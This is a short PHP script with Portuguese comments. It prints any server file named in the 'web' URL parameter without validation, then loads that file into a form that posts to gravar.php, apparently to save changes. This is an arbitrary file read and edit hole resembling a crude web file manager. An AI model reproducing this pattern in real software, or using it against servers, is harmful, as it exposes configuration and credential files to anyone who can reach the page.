<?php

echo $REMOTE_ADDR;

$arquivo =  $_GET['web'];
 
// Verifica se o arquivo existe

if ( file_exists( $arquivo ) ) {
	// Cria o recurso (abrir o arquivo)
	$handle = fopen( $arquivo, 'r' );
 
	// Lê o arquivo (se existir) 
	$ler = fread( $handle, filesize($arquivo) );
 
	// Mostra dados na tela
	echo $ler;
 
	// Fecha o arquivo
	fclose($handle);
}

?>


<?php

$arquivo = file("$arquivo");

echo "<form action=\"gravar.php\" id=\"form\" name=\"form\" method=\"post\">";
echo "Gravar o conteudo deste Campo.TxT :<br /><textarea name=\"texto\" rows=\"20\" cols=\"90\">";
foreach($arquivo as $texto) { echo "$texto"; }

echo "</textarea><br />";
echo "<input type=\"submit\" value=\"Enviar\">";
echo "</form>";

?>